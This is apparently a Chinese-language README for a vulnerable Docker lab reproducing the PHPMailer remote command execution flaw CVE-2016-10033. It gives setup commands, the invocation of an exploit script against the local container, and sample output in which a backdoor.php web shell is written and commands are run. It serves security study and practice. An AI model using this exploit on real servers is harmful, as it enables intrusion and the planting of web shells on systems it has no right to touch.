## PHPMailer < 5.2.18 远程命令执行漏洞环境 (CVE-2016-10033)

### 说明

本环境基于 [PHPMailer < 5.2.18 Remote Code Execution exploit and vulnerable container](https://github.com/opsxcq/exploit-CVE-2016-10033) 修改

### 漏洞信息

 PHPMailer 是一个强大的 PHP 编写的邮件发送类，使用它可以更加便捷的发送邮件，并且还能发送附件和 HTML 格式的邮件，同时还能使用 SMTP 服务器来发送邮件。PHPMailer(版本 < 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。漏洞发现者：Dawid Golunski

### 影响版本

PHPMailer < 5.2.18

### 镜像信息

类型 | 值
:-:|:-:
网站物理路径 | `/var/www/html/`


### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:p_phpmailer_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:p_phpmailer_1
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

 访问 http://127.0.0.1:8000 看到表单界面代表启动成功

### Exp

Exp 使用方法：

```
$ ./exp.sh host:port
```

假设容器启动后访问的地址为：http://127.0.0.1:8000/

```
$ ./exp.sh 127.0.0.1:8000
```

执行完后耐心等待一会（比较慢，大概2分钟以内），就会向服务器中写入 backdoor.php 文件(写入的物理路径见`exp.sh`,默认写入到`/var/www/html/`目录下)，然后就看到如下输出：

```
➜ ./exp.sh 127.0.0.1:8000
[+] CVE-2016-10033 exploit by opsxcq
[+] Exploiting 127.0.0.1:8000
[+] Target exploited, acessing shell at http://127.0.0.1:8000/backdoor.php
[+] Checking if the backdoor was created on target system
[+] Backdoor.php found on remote system
[+] Running whoami
www-data
RemoteShell> id
[+] Running id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 相关链接

* [PHPMailer < 5.2.18 Remote Code Execution](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)
* [PHPMailer 命令执行漏洞（CVE-2016-10033）分析——长亭科技](https://blog.chaitin.cn/phpmailer-cve-2016-10033/)
* [PHPMailer < 5.2.18 Remote Code Execution exploit and vulnerable container](https://github.com/opsxcq/exploit-CVE-2016-10033)
